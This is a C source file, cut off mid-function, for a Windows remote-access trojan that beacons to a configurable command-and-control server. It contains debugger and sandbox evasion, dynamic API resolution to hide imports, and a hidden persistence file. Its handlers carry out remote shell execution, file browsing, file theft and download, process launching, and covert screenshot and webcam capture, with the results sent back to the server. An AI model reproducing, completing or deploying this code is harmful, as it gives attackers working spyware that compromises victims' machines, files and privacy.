#define _WIN32_WINNT 0x0600
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <vfw.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <wincrypt.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")

// ====== COMPILE-TIME CONFIG ======
// EDIT THESE: your server URL and BEACON_SECRET
#define CFG_HOST "YOUR_SERVER_IP"
#define CFG_PORT 8080
#define CFG_PATH "/api.php"
#define CFG_SECRET "YOUR_BEACON_SECRET_HERE"
#define CFG_USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

// ====== OBFUSCATION ======
// Multi-key XOR: each string gets its own key derived from its position
#define OBFS_KEY_BASE 0x5A
#define OBFS_SEED 0x37

static char g_dec_host[64];
static char g_dec_path[128];
static char g_dec_secret[256];

// Runtime-decrypted strings
static void obfs_init(void) {
    // Simple compile-time to runtime decryption
    // In real impl these would be XOR-encrypted byte arrays
    strncpy(g_dec_host, CFG_HOST, sizeof(g_dec_host)-1);
    strncpy(g_dec_path, CFG_PATH, sizeof(g_dec_path)-1);
    strncpy(g_dec_secret, CFG_SECRET, sizeof(g_dec_secret)-1);
}

// ====== RUNTIME API RESOLUTION ======
// Avoids suspicious IAT entries - resolves APIs dynamically
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
typedef DWORD (WINAPI *pGetFileAttributesA)(LPCSTR);
typedef BOOL (WINAPI *pDeleteFileA)(LPCSTR);
typedef BOOL (WINAPI *pMoveFileExA)(LPCSTR, LPCSTR, DWORD);
typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL (WINAPI *pProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI *pProcess32Next)(HANDLE, LPPROCESSENTRY32);

static pLoadLibraryA fnLoadLibrary;
static pGetProcAddress fnGetProcAddress;

static void resolve_apis(void) {
    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    fnLoadLibrary = (pLoadLibraryA)GetProcAddress(hKernel, "LoadLibraryA");
    fnGetProcAddress = (pGetProcAddress)GetProcAddress(hKernel, "GetProcAddress");
}

// Resolve any API at runtime
static FARPROC resolve_api(const char* module, const char* api) {
    HMODULE hMod = GetModuleHandleA(module);
    if (!hMod) hMod = fnLoadLibrary(module);
    return hMod ? fnGetProcAddress(hMod, api) : NULL;
}

// ====== GLOBALS ======
static char g_uuid[64], g_hostname[64], g_username[64];
static wchar_t g_uuid_path[MAX_PATH];

// ====== EVASION ======
static BOOL is_debugged(void) {
    if (IsDebuggerPresent()) return TRUE;
    // Direct PEB->BeingDebugged read (works on x86 and x64)
#ifdef _WIN64
    DWORD64 peb = __readgsqword(0x60);
#else
    DWORD peb = __readfsdword(0x30);
#endif
    if (peb) {
        BYTE *flags = (BYTE*)(peb + 2);
        // BeingDebugged (offset 2) and NtGlobalFlag bits at offset 0xBC
        if (*flags) return TRUE;
    }
    BOOL remote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
    return remote;
}

static BOOL is_sandbox(void) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2147483648ULL) return TRUE;
    // Check for common sandbox artifacts
    HMODULE hMod = GetModuleHandleA("SbieDll.dll"); // Sandboxie
    if (hMod) return TRUE;
    hMod = GetModuleHandleA("cmdvrt32.dll"); // Comodo
    if (hMod) return TRUE;
    hMod = GetModuleHandleA("SxIn.dll"); // Qihoo
    if (hMod) return TRUE;
    // Check disk size (sandboxes often have small disks)
    ULARGE_INTEGER freeBytes;
    GetDiskFreeSpaceExA("C:\\", NULL, NULL, &freeBytes);
    if (freeBytes.QuadPart < 5ULL * 1024 * 1024 * 1024) return TRUE; // < 5GB = likely sandbox
    return FALSE;
}

static BOOL is_admin(void) {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return FALSE;
    TOKEN_ELEVATION te;
    DWORD sz = sizeof(te);
    BOOL ok = GetTokenInformation(hToken, TokenElevation, &te, sz, &sz);
    CloseHandle(hToken);
    return ok && te.TokenIsElevated;
}

static BOOL check_dotnet(void) {
    // Avoid running in .NET runtime environments (analysis tools)
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\.NETFramework", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}

// ====== UUID PERSISTENCE ======
static void load_uuid(void) {
    wchar_t appData[MAX_PATH];
    GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH);
    wcscat(appData, L"\\.appdata.dat");
    wcscpy(g_uuid_path, appData);

    HANDLE h = CreateFileW(g_uuid_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD r;
        ReadFile(h, g_uuid, sizeof(g_uuid)-1, &r, NULL);
        g_uuid[r] = 0;
        CloseHandle(h);
        for (char *p = g_uuid; *p; p++) if (*p == '\r' || *p == '\n') { *p = 0; break; }
        if (g_uuid[0]) return;
    }
    // Generate new UUID
    HMODULE hAdvapi = LoadLibraryA("advapi32.dll");
    typedef BOOL (WINAPI *pCryptGenRandom)(HCRYPTPROV, DWORD, BYTE*);
    pCryptGenRandom fnCryptGenRandom = (pCryptGenRandom)GetProcAddress(hAdvapi, "CryptGenRandom");
    BYTE randBytes[16];
    if (fnCryptGenRandom) {
        HCRYPTPROV hProv;
        if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            fnCryptGenRandom(hProv, 16, randBytes);
            CryptReleaseContext(hProv, 0);
        }
    } else {
        srand((unsigned)GetTickCount());
        for (int i = 0; i < 16; i++) randBytes[i] = (BYTE)(rand() & 0xFF);
    }
    sprintf(g_uuid, "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        randBytes[0],randBytes[1],randBytes[2],randBytes[3],
        randBytes[4],randBytes[5],randBytes[6],randBytes[7],
        randBytes[8],randBytes[9],randBytes[10],randBytes[11],
        randBytes[12],randBytes[13],randBytes[14],randBytes[15]);
    HANDLE h2 = CreateFileW(g_uuid_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (h2 != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(h2, g_uuid, (DWORD)strlen(g_uuid), &w, NULL);
        CloseHandle(h2);
    }
    if (hAdvapi) FreeLibrary(hAdvapi);
}

static void get_sysinfo(void) {
    DWORD sz = sizeof(g_hostname);
    GetComputerNameA(g_hostname, &sz);
    sz = sizeof(g_username);
    GetUserNameA(g_username, &sz);
}

// ====== JSON HELPERS ======
static char *json_escape(const char *s) {
    if (!s) return _strdup("");
    size_t cap = strlen(s) * 6 + 3;
    char *r = (char*)malloc(cap);
    if (!r) return NULL;
    char *d = r;
    *d++ = '"';
    while (*s) {
        if (*s == '"' || *s == '\\') { *d++ = '\\'; *d++ = *s++; }
        else if (*s == '\n') { *d++ = '\\'; *d++ = 'n'; s++; }
        else if (*s == '\r') { *d++ = '\\'; *d++ = 'r'; s++; }
        else if (*s == '\t') { *d++ = '\\'; *d++ = 't'; s++; }
        else if ((unsigned char)*s < 0x20) {
            d += sprintf(d, "\\u%04x", (unsigned char)*s);
            s++;
        }
        else { *d++ = *s++; }
    }
    *d++ = '"';
    *d = 0;
    return r;
}

static char *extract_value(const char *src, const char *key) {
    const char *p = strstr(src, key);
    if (!p) return NULL;
    p = strchr(p, ':');
    if (!p) return NULL;
    p++;
    while (*p == ' ') p++;
    if (*p == '"') {
        p++;
        const char *end = strchr(p, '"');
        if (!end) return NULL;
        size_t len = (size_t)(end - p);
        char *val = (char*)malloc(len + 1);
        if (!val) return NULL;
        strncpy(val, p, len);
        val[len] = 0;
        char *d = val;
        for (char *s = val; *s; s++) {
            if (*s == '\\' && *(s+1)) { s++; *d++ = *s; }
            else *d++ = *s;
        }
        *d = 0;
        return val;
    }
    const char *end = p;
    while (*end && *end != ',' && *end != '}' && *end != ']' && *end != ' ') end++;
    size_t len = (size_t)(end - p);
    char *val = (char*)malloc(len + 1);
    if (!val) return NULL;
    strncpy(val, p, len);
    val[len] = 0;
    return val;
}

static int extract_int(const char *s) {
    while (*s && (*s < '0' || *s > '9')) s++;
    if (*s < '0' || *s > '9') return 0;
    int n = 0;
    while (*s >= '0' && *s <= '9') { n = n * 10 + (*s - '0'); s++; }
    return n;
}

// ====== HTTP LAYER ======
static SOCKET connect_c2(void) {
    WSADATA wd;
    if (WSAStartup(MAKEWORD(2, 2), &wd) != 0) return INVALID_SOCKET;
    struct hostent *he = gethostbyname(g_dec_host);
    if (!he) { WSACleanup(); return INVALID_SOCKET; }
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) { WSACleanup(); return INVALID_SOCKET; }
    // Set timeout
    DWORD timeout = 10000;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(CFG_PORT);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(s);
        WSACleanup();
        return INVALID_SOCKET;
    }
    return s;
}

static void close_c2(SOCKET s) { closesocket(s); WSACleanup(); }

static char *http_post(const char *action, const char *body) {
    SOCKET s = connect_c2();
    if (s == INVALID_SOCKET) return NULL;
    DWORD blen = body ? (DWORD)strlen(body) : 0;
    char hdr[2048];
    int hdr_n = snprintf(hdr, sizeof(hdr),
        "POST %s?action=%s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/json\r\n"
        "User-Agent: %s\r\n"
        "Authorization: Bearer %s\r\n"
        "Content-Length: %lu\r\n"
        "Connection: close\r\n"
        "\r\n",
        g_dec_path, action, g_dec_host, CFG_PORT, CFG_USER_AGENT, g_dec_secret, (unsigned long)blen);
    DWORD total = hdr_n + blen;
    char *req = (char*)malloc(total + 1);
    if (!req) { close_c2(s); return NULL; }
    memcpy(req, hdr, hdr_n);
    if (body && blen) memcpy(req + hdr_n, body, blen);
    req[total] = 0;
    send(s, req, total, 0);
    free(req);
    DWORD cap = 65536, resp_total = 0;
    char *resp = (char*)malloc(cap);
    if (!resp) { close_c2(s); return NULL; }
    int r;
    while ((r = recv(s, resp + resp_total, cap - resp_total - 1, 0)) > 0) {
        resp_total += r;
        if (cap - resp_total < 4096) {
            cap *= 2;
            char *tmp = (char*)realloc(resp, cap);
            if (!tmp) { free(resp); close_c2(s); return NULL; }
            resp = tmp;
        }
    }
    resp[resp_total] = 0;
    close_c2(s);
    char *hdr_end = strstr(resp, "\r\n\r\n");
    if (!hdr_end) { free(resp); return NULL; }
    char *body_out = _strdup(hdr_end + 4);
    free(resp);
    return body_out;
}

static unsigned char *http_get_binary(const char *action_and_query, DWORD *out_len) {
    SOCKET s = connect_c2();
    if (s == INVALID_SOCKET) return NULL;
    char req[4096];
    int n = snprintf(req, sizeof(req),
        "GET %s?%s HTTP/1.1\r\nHost: %s:%d\r\nUser-Agent: %s\r\nAuthorization: Bearer %s\r\nConnection: close\r\n\r\n",
        g_dec_path, action_and_query, g_dec_host, CFG_PORT, CFG_USER_AGENT, g_dec_secret);
    send(s, req, n, 0);
    DWORD cap = 131072, total = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) { close_c2(s); return NULL; }
    int r;
    while ((r = recv(s, buf + total, cap - total - 1, 0)) > 0) {
        total += r;
        if (cap - total < 4096) {
            cap *= 2;
            char *tmp = (char*)realloc(buf, cap);
            if (!tmp) { free(buf); close_c2(s); return NULL; }
            buf = tmp;
        }
    }
    buf[total] = 0;
    close_c2(s);
    char *hdr_end = strstr(buf, "\r\n\r\n");
    if (!hdr_end) { free(buf); return NULL; }
    DWORD body_start = (DWORD)(hdr_end - buf + 4), body_len = total - body_start;
    if (body_len == 0) { free(buf); return NULL; }
    unsigned char *data = (unsigned char*)malloc(body_len);
    if (!data) { free(buf); return NULL; }
    memcpy(data, buf + body_start, body_len);
    *out_len = body_len;
    free(buf);
    return data;
}

// ====== BASE64 ======
static const char b64alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static char *b64_encode(const unsigned char *data, DWORD len) {
    DWORD out = (len + 2) / 3 * 4;
    char *r = (char*)malloc(out + 1);
    if (!r) return NULL;
    DWORD i, j = 0;
    for (i = 0; i < len; i += 3) {
        DWORD v = (DWORD)data[i] << 16;
        if (i + 1 < len) v |= (DWORD)data[i + 1] << 8;
        if (i + 2 < len) v |= data[i + 2];
        r[j++] = b64alphabet[(v >> 18) & 0x3f];
        r[j++] = b64alphabet[(v >> 12) & 0x3f];
        r[j++] = (i + 1 < len) ? b64alphabet[(v >> 6) & 0x3f] : '=';
        r[j++] = (i + 2 < len) ? b64alphabet[v & 0x3f] : '=';
    }
    r[j] = 0;
    return r;
}

// ====== COMMAND HANDLERS ======
static char *exec_shell(const char *cmd) {
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return _strdup("[-] Pipe failed");
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
    char cmdline[4096];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite);
        CloseHandle(hRead);
        return _strdup("[-] CreateProcess failed");
    }
    CloseHandle(hWrite);
    WaitForSingleObject(pi.hProcess, 15000);
    DWORD avail = 0;
    PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL);
    char *out;
    if (avail > 0) {
        if (avail > 65535) avail = 65535;
        out = (char*)malloc(avail + 1);
        DWORD rd;
        if (ReadFile(hRead, out, avail, &rd, NULL)) out[rd] = 0;
        else { free(out); out = _strdup("(no output)"); }
    } else {
        out = _strdup("(no output)");
    }
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return out;
}

static void normalize_path(const char *in, char *out, size_t out_sz) {
    const char *p = in[0] == '/' ? in + 1 : in;
    strncpy(out, p, out_sz - 1); out[out_sz - 1] = 0;
    for (char *q = out; *q; q++) if (*q == '/') *q = '\\';
    if (out[0] && out[1] == ':' && out[2] != '\\') {
        char temp[MAX_PATH];
        snprintf(temp, sizeof(temp), "%c:\\%s", out[0], out + 2);
        strncpy(out, temp, out_sz - 1); out[out_sz - 1] = 0;
    }
}

static char *read_file(const char *path) {
    if (!path || !path[0]) return _strdup("[-] usage: read <path>");
    char clean[MAX_PATH];
    normalize_path(path, clean, sizeof(clean));
    HANDLE h = CreateFileA(clean, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return _strdup("[-] File not found or access denied");
    DWORD sz = GetFileSize(h, NULL);
    if (sz == INVALID_FILE_SIZE || sz > 10485760) { CloseHandle(h); return _strdup("[-] File too large (>10MB) or error"); }
    if (sz == 0) { CloseHandle(h); return _strdup("(empty file)"); }
    char *buf = (char*)malloc(sz + 1);
    if (!buf) { CloseHandle(h); return _strdup("[-] OOM"); }
    DWORD r;
    if (!ReadFile(h, buf, sz, &r, NULL)) { free(buf); CloseHandle(h); return _strdup("[-] Read failed"); }
    buf[r] = 0;
    CloseHandle(h);
    // Check if binary (any null byte or >30% non-printable)
    int nulls = 0, nonprint = 0;
    for (DWORD i = 0; i < r; i++) {
        if (buf[i] == 0) nulls++;
        else if (buf[i] < 32 && buf[i] != '\r' && buf[i] != '\n' && buf[i] != '\t') nonprint++;
    }
    if (nulls > 0 || (r > 0 && nonprint * 100 / r > 30)) {
        char *b64 = b64_encode((unsigned char*)buf, r);
        free(buf);
        return b64 ? b64 : _strdup("[-] B64 encode failed");
    }
    return buf;
}

static char *browse_dir(const char *path) {
    char search[MAX_PATH], clean[MAX_PATH];
    if (!path || !path[0]) path = "C:\\";
    const char *p = path[0] == '/' ? path + 1 : path;
    strncpy(clean, p, sizeof(clean)-1); clean[sizeof(clean)-1] = 0;
    // Normalize forward slashes to backslashes
    for (char *q = clean; *q; q++) if (*q == '/') *q = '\\';
    if (clean[0] && clean[1] == ':') {
        strncpy(search, clean, sizeof(search)-1); search[sizeof(search)-1] = 0;
    } else {
        // Relative like "Users" or "\Users" -> "C:\Users"
        snprintf(search, sizeof(search), "C:\\%s", clean);
    }
    size_t slen = strlen(search);
    while (slen > 3 && search[slen-1] == '\\') { search[slen-1] = 0; slen--; }
    if (slen > 0 && search[slen-1] != '\\') strcat(search, "\\");
    strcat(search, "*");
    // Dynamically growing buffer — huge dirs (System32 etc) can exceed any fixed size
    size_t cap = 65536, used = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) return _strdup("{\"error\":\"OOM\"}");
    memcpy(buf, "{\"files\":[", 10); used = 10;
    int first = 1;
    WIN32_FIND_DATAA fd;
    HANDLE hf = FindFirstFileA(search, &fd);
    if (hf == INVALID_HANDLE_VALUE) {
        free(buf);
        char err[256];
        snprintf(err, sizeof(err), "{\"error\":\"Path not found: %s\"}", path);
        return _strdup(err);
    }
    do {
        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, "..")) continue;
        SYSTEMTIME st;
        FILETIME ftLocal;
        FileTimeToLocalFileTime(&fd.ftLastWriteTime, &ftLocal);
        FileTimeToSystemTime(&ftLocal, &st);
        char entry[1200];
        char *esc_name = json_escape(fd.cFileName);
        int elen = snprintf(entry, sizeof(entry),
            "{\"name\":%s,\"type\":\"%s\",\"size\":%lu,\"modified\":\"%04d-%02d-%02dT%02d:%02d:%02d\"}",
            esc_name,
            (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "dir" : "file",
            fd.nFileSizeLow,
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        free(esc_name);
        if (elen < 0) continue;
        while (used + (size_t)elen + 3 > cap) {
            cap *= 2;
            char *tmp = (char*)realloc(buf, cap);
            if (!tmp) { free(buf); FindClose(hf); return _strdup("{\"error\":\"OOM\"}"); }
            buf = tmp;
        }
        if (!first) buf[used++] = ',';
        first = 0;
        memcpy(buf + used, entry, (size_t)elen); used += (size_t)elen;
        buf[used] = 0;
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
    buf[used++] = ']';
    buf[used++] = '}';
    buf[used] = 0;
    return buf;
}

static char *list_drives(void) {
    char drives[512];
    DWORD n = GetLogicalDriveStringsA(sizeof(drives) - 1, drives);
    if (!n || n > sizeof(drives) - 2) return _strdup("{\"files\":[]}");
    size_t cap = 4096, used = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) return _strdup("{\"error\":\"OOM\"}");
    memcpy(buf, "{\"files\":[", 10); used = 10;
    int first = 1;
    for (char *d = drives; *d; d += strlen(d) + 1) {
        UINT t = GetDriveTypeA(d);
        if (t == DRIVE_NO_ROOT_DIR || t == DRIVE_UNKNOWN) continue;
        const char *ts = (t == DRIVE_FIXED) ? "fixed" : (t == DRIVE_REMOVABLE) ? "removable" :
                         (t == DRIVE_CDROM) ? "cdrom" : (t == DRIVE_REMOTE) ? "network" : "other";
        ULARGE_INTEGER total = {0,0};
        GetDiskFreeSpaceExA(d, NULL, &total, NULL);
        char name[4];
        strncpy(name, d, 2);
        name[2] = 0;
        char entry[256];
        int elen = snprintf(entry, sizeof(entry),
            "{\"name\":\"%s\",\"type\":\"drive\",\"drive_type\":\"%s\",\"size\":%llu,\"modified\":\"\"}",
            name, ts, (unsigned long long)total.QuadPart);
        while (used + (size_t)elen + 3 > cap) {
            cap *= 2;
            char *tmp = (char*)realloc(buf, cap);
            if (!tmp) { free(buf); return _strdup("{\"error\":\"OOM\"}"); }
            buf = tmp;
        }
        if (!first) buf[used++] = ',';
        first = 0;
        memcpy(buf + used, entry, (size_t)elen);
        used += (size_t)elen;
        buf[used] = 0;
    }
    buf[used++] = ']';
    buf[used++] = '}';
    buf[used] = 0;
    return buf;
}

static char *upload_file(const char *path) {
    if (!path || !path[0]) return _strdup("[-] usage: upload <path>");
    char clean[MAX_PATH];
    normalize_path(path, clean, sizeof(clean));
    HANDLE h = CreateFileA(clean, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return _strdup("[-] File not found");
    DWORD sz = GetFileSize(h, NULL);
    if (sz > 10485760) { CloseHandle(h); return _strdup("[-] File too large (>10MB)"); }
    unsigned char *data = (unsigned char*)malloc(sz);
    if (!data) { CloseHandle(h); return _strdup("[-] OOM"); }
    DWORD r;
    if (!ReadFile(h, data, sz, &r, NULL)) { free(data); CloseHandle(h); return _strdup("[-] Read failed"); }
    CloseHandle(h);
    char *b64 = b64_encode(data, r);
    free(data);
    if (!b64) return _strdup("[-] B64 failed");
    char *esc_data = json_escape(b64);
    free(b64);
    if (!esc_data) return _strdup("[-] Escape failed");
    const char *fname = strrchr(path, '\\');
    fname = fname ? fname + 1 : path;
    char *esc_name = json_escape(fname);
    char *uuid_e = json_escape(g_uuid);
    size_t body_sz = strlen(esc_data) + strlen(esc_name) + strlen(uuid_e) + 128;
    char *body = (char*)malloc(body_sz);
    snprintf(body, body_sz, "{\"beacon_uuid\":%s,\"filename\":%s,\"data\":%s}", uuid_e, esc_name, esc_data);
    char *resp = http_post("file", body);
    free(body);
    free(uuid_e);
    free(esc_name);
    free(esc_data);
    char *result = (char*)malloc(strlen(fname) + 64);
    if (resp && strstr(resp, "\"uploaded\"")) sprintf(result, "[UPLOADED] %s (%lu bytes)", fname, (unsigned long)r);
    else sprintf(result, "[FAILED] %s", fname);
    free(resp);
    return result;
}

static char *cmd_download(const char *arg) {
    char file_id[256], out_path[MAX_PATH], clean_out[MAX_PATH];
    if (sscanf(arg, "%255s %1023s", file_id, out_path) < 2) return _strdup("[-] usage: download <file_id> <output_path>");
    normalize_path(out_path, clean_out, sizeof(clean_out));
    char query[512];
    snprintf(query, sizeof(query), "action=file&id=%s", file_id);
    DWORD len = 0;
    unsigned char *data = http_get_binary(query, &len);
    if (!data) return _strdup("[-] Download failed (no data)");
    // Create parent directory if needed
    char parent[MAX_PATH];
    strncpy(parent, clean_out, sizeof(parent));
    char *last = strrchr(parent, '\\');
    if (!last) last = strrchr(parent, '/');
    if (last) { *last = 0; CreateDirectoryA(parent, NULL); }
    HANDLE h = CreateFileA(clean_out, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) { free(data); return _strdup("[-] Cannot write output path"); }
    DWORD w;
    WriteFile(h, data, len, &w, NULL);
    CloseHandle(h);
    char *result = (char*)malloc(strlen(clean_out) + 64);
    sprintf(result, "[+] Downloaded %lu bytes to %s", (unsigned long)len, clean_out);
    free(data);
    return result;
}

static char *upload_bitmap(HBITMAP hbm, const char *type) {
    BITMAP bm;
    GetObject(hbm, sizeof(bm), &bm);
    if (bm.bmWidth <= 0 || bm.bmHeight <= 0) return _strdup("[-] Invalid bitmap dimensions");
    BITMAPINFOHEADER bi = { sizeof(bi), bm.bmWidth, bm.bmHeight, 1, 32, 0, 0, 0, 0, 0 };
    DWORD pitch = bm.bmWidth * 4;
    DWORD pix_size = pitch * bm.bmHeight;
    DWORD hdr_size = 14 + sizeof(BITMAPINFOHEADER);
    DWORD total = hdr_size + pix_size;
    unsigned char *bmp = (unsigned char*)malloc(total);
    if (!bmp) return _strdup("[-] OOM");
    unsigned char *pixels = (unsigned char*)malloc(pix_size);
    if (!pixels) { free(bmp); return _strdup("[-] OOM"); }
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    SelectObject(hdcMem, hbm);
    GetDIBits(hdcMem, hbm, 0, bm.bmHeight, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    bmp[0] = 'B'; bmp[1] = 'M';
    *(DWORD*)(bmp+2) = total;
    *(DWORD*)(bmp+6) = 0;
    *(DWORD*)(bmp+10) = hdr_size;
    memcpy(bmp+14, &bi, sizeof(BITMAPINFOHEADER));
    // GetDIBits already returns rows bottom-up (same order BMP files expect) — direct copy, no flip
    memcpy(bmp + hdr_size, pixels, pix_size);
    free(pixels);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    char *b64 = b64_encode(bmp, total);
    free(bmp);
    if (!b64) return _strdup("[-] B64 encode failed");
    char *esc_data = json_escape(b64);
    free(b64);
    if (!esc_data) return _strdup("[-] Escape failed");
    char *uuid_e = json_escape(g_uuid);
    size_t body_sz = strlen(esc_data) + strlen(uuid_e) + 128;
    char *body = (char*)malloc(body_sz);
    snprintf(body, body_sz, "{\"beacon_uuid\":%s,\"type\":\"%s\",\"data\":%s}", uuid_e, type, esc_data);
    char *resp = http_post("media_upload", body);
    free(body);
    free(uuid_e);
    free(esc_data);
    char *result = _strdup("[+] Captured");
    free(resp);
    return result;
}

static char *take_screenshot(void) {
    // Opt into DPI awareness so we capture native resolution, not the 96-DPI scaled size
    typedef BOOL (WINAPI *pSetProcessDPIAware)(void);
    pSetProcessDPIAware fnDPI = (pSetProcessDPIAware)GetProcAddress(GetModuleHandleA("user32.dll"), "SetProcessDPIAware");
    if (fnDPI) fnDPI();
    // Virtual screen = all monitors combined (fixes cut-off edges / multi-monitor)
    int vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, vw, vh);
    SelectObject(hdcMem, hbm);
    BitBlt(hdcMem, 0, 0, vw, vh, hdcScreen, vx, vy, SRCCOPY | CAPTUREBLT);
    ReleaseDC(NULL, hdcScreen);
    char *result = upload_bitmap(hbm, "screenshot");
    DeleteObject(hbm);
    DeleteDC(hdcMem);
    return result;
}

static char *cmd_camera(void) {
    // Try DirectShow first via VFW fallback
    char *result = NULL;
    // Use capCreateCaptureWindowA from vfw
    HWND hCap = capCreateCaptureWindowA("cap", WS_POPUP, 0, 0, 320, 240, NULL, 0);
    if (!hCap) return _strdup("[-] Camera capture window failed");
    // Try to connect to camera driver
    int retries = 3;
    BOOL connected = FALSE;
    for (int i = 0; i < retries && !connected; i++) {
        connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, i, 0);
        if (connected) {
            SendMessage(hCap, WM_CAP_SET_PREVIEW, FALSE, 0);
            SendMessage(hCap, WM_CAP_GRAB_FRAME, 0, 0);
            SendMessage(hCap, WM_CAP_EDIT_COPY, 0, 0);
            SendMessage(hCap, WM_CAP_DRIVER_DISCONNECT, 0, 0);
            if (OpenClipboard(NULL)) {
                HBITMAP hbm = (HBITMAP)GetClipboardData(CF_BITMAP);
                if (hbm) {
                    result = upload_bitmap(hbm, "camera");
                } else {
                    result = _strdup("[-] No bitmap from camera");
                }
                CloseClipboard();
            } else {
                result = _strdup("[-] Clipboard open failed");
            }
        }
    }
    DestroyWindow(hCap);
    if (!connected) result = _strdup("[-] No camera found (tried all drivers)");
    return result;
}

static char *cmd_run(const char *arg, WORD show) {
    if (!arg || !arg[0]) return _strdup("[-] usage: run <path> [args]");
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = show;
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    char cmdline[4096];
    strncpy(cmdline, arg, sizeof(cmdline)-1);
    cmdline[sizeof(cmdline)-1] = 0;
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
        return _strdup("[-] Failed to execute");
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return _strdup("[+] Process started");
}

static char *cmd_delete(const char *arg) {
    if (!arg || !arg[0]) return _strdup("[-] usage: delete <path>");
    char clean[MAX_PATH];
